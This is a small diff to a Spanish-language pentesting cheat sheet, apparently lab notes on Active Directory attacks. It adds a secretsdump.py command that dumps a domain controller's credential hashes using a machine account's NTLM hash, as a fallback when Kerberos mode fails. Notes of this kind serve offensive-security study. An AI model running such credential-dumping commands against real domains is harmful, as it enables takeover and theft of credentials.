@@ -158,7 +158,7 @@ impacket-secretsdump -k -no-pass -history -dc-ip 10.10.10.10 'CORP.LOCAL/DC01$'@
 
 ### SI EL MODO -K NO FUNCIONA
 ### EXTRAEMOS PRIMERO CON EL .PFX OBTENIDO, EL NTLM HASH (EXPLICADO MAS ARRIBA) Y LUEGO EJECUTAMOS
- 
+python3 secretsdump.py inlanefreight.local/dc01\$@10.129.234.174 -hashes <HASH_NTLM_AQUÍ> 
 ```
 
 ### Caso 4: Cuenta de Máquina Estándar (`WORKSTATION$` o `SERVER$`)
